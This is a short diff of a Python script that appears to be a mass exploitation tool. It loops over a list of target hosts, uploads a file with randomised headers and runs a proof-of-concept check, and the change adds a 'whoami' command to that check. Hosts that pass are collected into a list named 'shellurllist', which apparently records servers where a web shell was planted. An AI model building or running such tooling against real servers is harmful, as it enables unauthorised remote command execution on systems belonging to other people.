@@ -136,7 +136,7 @@ def main():
                 upload_status = upload(line,random_headers(),uploaddata,args.filename)
 
                 if upload_status:
-                    poc_status = poc(line,random_headers(),args.filename)
+                    poc_status = poc(line,random_headers(),args.filename,"whoami")
                     if poc_status:
                         shellurllist.append(line)
         f.close
